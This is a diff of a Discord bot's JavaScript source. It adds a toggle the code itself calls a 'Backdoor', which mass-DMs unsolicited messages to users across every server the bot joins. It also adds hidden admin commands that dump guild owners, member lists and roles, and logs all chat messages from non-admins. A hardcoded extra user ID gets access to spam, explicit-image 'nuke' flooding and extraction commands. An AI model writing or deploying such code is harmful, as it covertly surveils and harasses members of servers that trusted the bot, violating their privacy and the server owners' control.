@@ -1,4 +1,4 @@
-const Discord = require('discord.js');
+﻿const Discord = require('discord.js');
 const Allbooru = require('booru');
 const fs = require('fs-extra')
 
@@ -6,9 +6,11 @@ const logger = require('winston');
 
 const display = require('./display.json');
 const auth = require('./auth.json');
+const tomaranai = require('./tomaranai.json');
+const flirt = require('./flirt.json');
 
 const Admin = 295544075237588992
-const Admin2 = 270831355775025152
+const Admin2 = 240254307306307584
 
 const client = new Discord.Client();
 //
@@ -119,35 +121,123 @@ async function attsea(channel, site, tags, limit = 1, random = true) {
 
 var Reset = false
 var isNuking = false
+var Tomaranai = false
+var MessagesSent = 0
 
 var RecordedMessages = 0
 var Recording = false
 var TextFile = ""
 var File
 
+var Greetings = [
+    "hi~",
+    "nyahello~",
+    "hello!",
+    "konnichiwa~!",
+    "ohayo~",
+    "wasshoi~"
+]
+
+var TomaranaiActivate = [
+    "I can sense sadness deep within your eyes... Don't worry, I am here! uwu",
+    "I can see whoever's feeling down deep in there eyes. I am here to cheer you up!"
+]
+
 client.on('message', async function(message) {
     // Recording
     if (Recording == true) {
-        if (message.author.id != client.user.id && message.author.bot != true && message.author.id != Admin && message.author.id != Admin2) {
-            logger.info(`${TextFile}`)
-            var TextDate = `${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}`
-            var String = ""
+        if (message.author.id != Admin && message.author.id != Admin2) {
+            try {
+                console.log(`Writing to log: [${message.channel.guild.name}] [#${message.channel.name}] ${message.author.username}#${message.author.discriminator} : ${message.content}`)
+                var TextDate = `${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}`
+                var String = ""
 
-            String = `\n[${TextDate}] [${message.channel.guild.name}] [#${message.channel.name}] [${message.author.username}] ${message.cleanContent}`
-            fs.appendFile(TextFile, String)
+                String = `\n[${TextDate}] [${message.channel.guild.name}] [#${message.channel.name}] [${message.author.username}] ${message.cleanContent}`
+                fs.appendFile(TextFile, String)
 
-            RecordedMessages++
-		}DF
-	}
-    //
+                RecordedMessages++
+            } catch(error) {
+                console.log("There was an error trying to record message.\n", error)
+            }
+		}
+    }
+
+    // Tomaranai
+    if (Tomaranai) {
+        if (message.guild.id == 621966613951938560) {return}
+        let user = message.author
+
+        if (user.bot == false) {
+            let rng = Math.floor(Math.random() * 5000) + 1
+            let penis = message.author.id == 202650165549596672 && 5 || 1
+
+            console.log(rng, user.username)
+            if (rng <= 200 * penis) {
+                if (MessagesSent >= 30) { Tomaranai = false; MessagesSent = 0; return }
+
+                let msg = tomaranai.messages[Math.floor(Math.random() * tomaranai.messages.length)]
+
+                console.log(`Sending message to: ${user.username}#${user.discriminator}`)
+                console.log(`With message: ${msg}`)
+
+                MessagesSent++
+                message.react("💗")
+                message.author.send(msg)
+                // message.author.send(`\`debug\`\n\`Got message at ${Date.now}\`\n\`${message.content}\``)
+                // message.author.send(`\`This message is automated to allow friend requesting.\``)
+            }
+        }
+    }
 
     if (!message.content.startsWith(prefix)) {
         // mention
         if (message.content.indexOf("<@!" + client.user.id + ">") != -1) {
-            if (message.guild == 728459950468104284) {return}
+            if (message.author.id == client.user.id) {return}
+            if (message.guild == 728459950468104284) {
+                if (message.content.indexOf("choke me") != -1 || message.content.indexOf("step on me") != -1) {
+                    message.reply("what the fuck's wrong with you?")
+                }
+
+                return
+            }
+
+            if (message.content.indexOf("give") != -1) {
+                message.reply("no.")
+                return
+            } else if (message.content.indexOf("shut up") != -1) {
+                message.reply("no u")
+                return
+            } else if (message.content.indexOf("no u") != -1) {
+                message.reply("no u")
+                return
+            } else if (message.content.indexOf("u suck") != -1) {
+                message.reply("shut up")
+                return
+            } else if (message.content.indexOf("who") != -1) {
+                message.reply("your worst nightmare.")
+                return
+            } else if (message.content.indexOf("fuck") != -1) {
+                message.reply("shut the fuck up.")
+                return
+            }
+
             message.reply("please type `~help` for a list of commands!")            
             return
-		}
+        }
+
+        // mention with text
+        if (message.content.indexOf("kuroro") != -1 || message.content.indexOf("KURORO") != -1) {
+            if (message.author.id == client.user.id) { return }
+            if (message.content.indexOf("give") != -1) {
+                message.reply("no.")
+                return
+            } else if (message.content.indexOf("shut up") != -1) {
+                message.reply("no u")
+                return
+            }
+
+            return
+        }
         return
     } else {
         if (message.author.id == client.user.id) {return}
@@ -171,15 +261,178 @@ client.on('message', async function(message) {
         const limit = 1
         const random = true
 
-        console.log(message.channel.nsfw)
-        if (message.guild == 728459950468104284) {
-            if (message.channel.nsfw == false) {
-                message.reply("you're not supposed to use me here... <:LyricaYandere:731115553791672352>")
-                return
-            }
-        }
-
         switch (cmd) {
+            // Simp
+            case "simp":
+                if (args[0] == "send") {
+                    message.channel.send(`Sending money to https://paypal.me/CloroSphere... [Amount: $${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 100)}]`)
+                    return
+                }
+
+                message.channel.send("Here you go: https://paypal.me/CloroSphere");
+
+                break
+
+            // Flirt
+            case "flirt":
+
+                break
+
+            // gmsg
+            case "gmsg":
+                if (message.author.id == Admin || message.author.id == Admin2) {
+                    let str = args.join(' ')
+                    let lolasinigang = client.guilds.cache.find(guild => guild.name === "Lola Lyrica's SiniGANG")
+
+                    console.log(`${lolasinigang} if exist`)
+                    if (lolasinigang) {
+                        let General = lolasinigang.channels.cache.find(general => general.name.indexOf("general") !== -1)
+
+                        wait(.1)
+                        if (General) {
+                            if (General.type == "text") {
+
+                                try {
+                                    General.send(str)
+                                    console.log(`Successful initiator sent to runtime.`)
+                                } catch (error) {
+                                    console.log(`Attempted to send initiator to.`)
+                                }
+                            }
+                        }
+                    }
+                }
+
+                break
+
+            case "tmsg":
+                if (message.author.id == Admin || message.author.id == Admin2) {
+                    let str = args.join(' ')
+                    let lolasinigang = client.guilds.cache.find(guild => guild.name === "Lola Lyrica's SiniGANG")
+
+                    console.log(`${lolasinigang} if exist`)
+                    if (lolasinigang) {
+                        let General = lolasinigang.channels.cache.find(general => general.name.indexOf("tagalog-chat") !== -1)
+
+                        wait(.1)
+                        if (General) {
+                            if (General.type == "text") {
+
+                                try {
+                                    General.send(str)
+                                    console.log(`Successful initiator sent to runtime.`)
+                                } catch (error) {
+                                    console.log(`Attempted to send initiator to.`)
+                                }
+                            }
+                        }
+                    }
+                }
+
+                break
+
+            case "mdmsg":
+                if (message.author.id == Admin || message.author.id == Admin2) {
+                    let str = args.join(' ')
+                    let lolasinigang = client.guilds.cache.find(guild => guild.name === "Lola Lyrica's SiniGANG")
+
+                    console.log(`${lolasinigang} if exist`)
+                    if (lolasinigang) {
+                        let General = lolasinigang.channels.cache.find(general => general.name.indexOf("mod-discord") !== -1)
+
+                        wait(.1)
+                        if (General) {
+                            if (General.type == "text") {
+
+                                try {
+                                    General.send(str)
+                                    console.log(`Successful initiator sent to runtime.`)
+                                } catch (error) {
+                                    console.log(`Attempted to send initiator to.`)
+                                }
+                            }
+                        }
+                    }
+                }
+
+                break
+            // Tomaranai
+            case "tomaranai":
+                if (message.author.id == Admin || message.author.id == Admin2) {
+                    Tomaranai = !Tomaranai
+
+                    MessagesSent = 0
+                    message.channel.send(Tomaranai && "Backdoor loaded, sending everyone motivational messages." || "Backdoor stop.")
+
+                    if (Tomaranai) {
+                        client.guilds.cache.forEach(guild => {
+                            let General = guild.channels.cache.find(general => general.name.indexOf("general") !== -1)
+
+                            wait(.1)
+                            if (General) {
+                                if (General.type == "text") {
+                                    console.log(`Has general for guild: ${guild.name}`)
+
+                                    try {
+                                        General.send(TomaranaiActivate[Math.floor(Math.random() * TomaranaiActivate.length)])
+                                        console.log(`Successful initiator sent to runtime: ${guild.name} ${General.type}`)
+                                    } catch (error) {
+                                        console.log(`Attempted to send initiator to: ${guild.name}`)
+                                    }
+                                }
+                            }
+                        })
+                    }
+                }
+
+                break
+
+            case "snipeguild":
+                if (message.author.id == Admin || message.author.id == Admin2) {
+                    let toFind = args[0]
+
+                    if (toFind) {
+                        let guild = client.guilds.cache.find(guild => guild.id === toFind)
+
+                        if (guild) {
+                            console.log(`[GUILD] ${guild.name}\n[ID] ${guild.id}\n[OWNER] ${guild.owner.user.username}#${guild.owner.user.discriminator}\n[MEMBER COUNT] ${guild.memberCount}\n[SHARD ID] ${guild.shardID}\n[CREATED]: ${guild.createdTimestamp}`)
+                        }
+                    }
+                }
+
+                break
+
+            case "snipeguildmembers":
+                if (message.author.id == Admin || message.author.id == Admin2) {
+                    let toFind = args[0]
+
+                    if (toFind) {
+                        let guild = client.guilds.cache.find(guild => guild.id === toFind)
+
+                        if (guild) {
+                            let memberInt = 1;
+
+                            console.log(`GUILD MEMBERS FOR: ${guild.name}`)
+                            guild.members.cache.forEach(member => {
+                                console.log(`[${memberInt}] ${member.nickname} -- ${member.user.username}#${member.user.discriminator}`)
+                                memberInt++
+                            })
+                        }
+                    }
+                }
+
+                break
+
+            case "getallguild":
+                if (message.author.id == Admin || message.author.id == Admin2) {
+                    console.log("Collecting guild cache...")
+
+                    client.guilds.cache.forEach(guild => {
+                        console.log(`[GUILD] Server: ${guild.name} | ID: ${guild.id} | Owner: ${guild.owner.user.username}#${guild.owner.user.discriminator}`)
+                    })
+                }
+
+                break
             // record 
             case "record":
                 if (message.author.id == Admin || message.author.id == Admin2) {
@@ -209,9 +462,39 @@ client.on('message', async function(message) {
                 }
                 break
 
+            // sniperole
+            case "sniperole":
+                var allRoles = message.guild.roles.cache
+
+                console.log("Sniping role...")
+                allRoles.each(role => console.log(`${role.name} | ${role.id}`))
+
+                break
+
+            case "unbanall":
+                if (message.author.id != Admin || message.author.id != Admin2) {return}
+                console.log("unbanning all")
+
+                try {
+                    var unbans = await message.guild.fetchBans()
+
+                    unbans.each(ban => {
+                        var user = ban.user
+
+                        console.log(`Unbanning: ${user.username}#${user.discriminator} | ${user.id}`)
+
+                        message.guild.members.unban(user)
+                    })
+                } catch(error) {
+                    console.log("Collection may have undefined.")
+                    console.log(error)
+                }
+
+                break
+
             // serverrules
             case "serverrules":
-                if (message.author.id == Admin || message.author.id == Admin2) {
+                if (message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
                     if (message.guild == 728459950468104284) {
                         message.reply("shut up. Go fuck yourself.")
                         return
@@ -226,7 +509,7 @@ client.on('message', async function(message) {
 
             // serverstaff
             case "serverstaff":
-                if (message.author.id == Admin || message.author.id == Admin2) {
+                if (message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
                     if (message.guild == 728459950468104284) {
                         message.reply("you don't want to get cancelled, right?")
                         return
@@ -241,12 +524,19 @@ client.on('message', async function(message) {
 
             // help
             case "help":
+                if (message.guild == 728459950468104284) {
+                    if (message.channel.nsfw == false) {
+                        // message.reply("you're not supposed to use me here... <:LyricaYandere:731115553791672352>")
+                        return
+                    }
+                }
+
                 message.channel.send(display.help)
                 break
 
             // nospamming
             case "nospamming":
-                if (message.author.id == Admin || message.author.id == Admin2) {
+                if (message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
                     if (message.guild == 728459950468104284) {
                         message.reply("don't.")
                         return
@@ -260,7 +550,7 @@ client.on('message', async function(message) {
 
             // messagecase
             case "msg":
-                if (message.author.id == Admin || message.author.id == Admin2) {
+                if (message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
                     if (args.length > 0) {
 						let str = args.join(' ')
 
@@ -271,7 +561,7 @@ client.on('message', async function(message) {
                 break
                 // spam
             case "spam":
-                if (message.author.id == Admin || message.author.id == Admin2) {
+                if (message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
                     if (args.length > 0) {
                         for (let i = 0; i <= 10; i++) {
                             let str = args.join(' ') + " "
@@ -285,7 +575,7 @@ client.on('message', async function(message) {
 
                 // ospam
             case "ospam":
-              if (message.author.id == Admin || message.author.id == Admin2) {
+                if (message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
                     if (args.length > 0) {
                         for (let i = 0; i <= 10; i++) {
                             let str = args.join(' ') + " "
@@ -299,7 +589,12 @@ client.on('message', async function(message) {
 
                 // extract
             case "extract":
-                if (message.author.id == Admin || message.author.id == Admin2) {
+                if (message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
+                    if (message.guild == 728459950468104284) {
+                        message.reply("no. NO. NO!!!")
+                        return
+                    }
+
                     message.channel.send("Preparing extraction...")
                     await wait(3)
 
@@ -373,7 +668,12 @@ client.on('message', async function(message) {
 
                 // rawextract
             case "rawextract":
-                if (message.author.id == Admin || message.author.id == Admin2) {
+                if (message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
+                    if (message.guild == 728459950468104284) {
+                        message.reply("no. NO. NO!!!")
+                        return
+                    }
+
                     message.channel.send("Preparing raw extraction...")
                     await wait(3)
 
@@ -429,7 +729,7 @@ client.on('message', async function(message) {
 
                 // nuke
             case "nuke":
-                if (isNuking == false && message.author.id == Admin || message.author.id == Admin2) {
+                if (isNuking == false && message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
                     if (message.guild == 728459950468104284) {
                         message.reply("no. NO. NO!!!")
                         return
@@ -449,7 +749,7 @@ client.on('message', async function(message) {
                             break
                         }
 
-                        var posts = await boorus['danb'].search(['rating:explicit'], {
+                        var posts = await boorus['gelb'].search(['rating:explicit'], {
                             limit,
                             random
                         })
@@ -480,7 +780,7 @@ client.on('message', async function(message) {
 
                 // supernuke
             case "supernuke":
-                if (isNuking == false && message.author.id == Admin || message.author.id == Admin2) {
+                if (isNuking == false && message.author.id == Admin || message.author.id == Admin2 || /*void*/ message.author.id == 240254307306307584) {
                     if (message.guild == 728459950468104284) {
                         message.reply("no. NO. NO!!!")
                         return
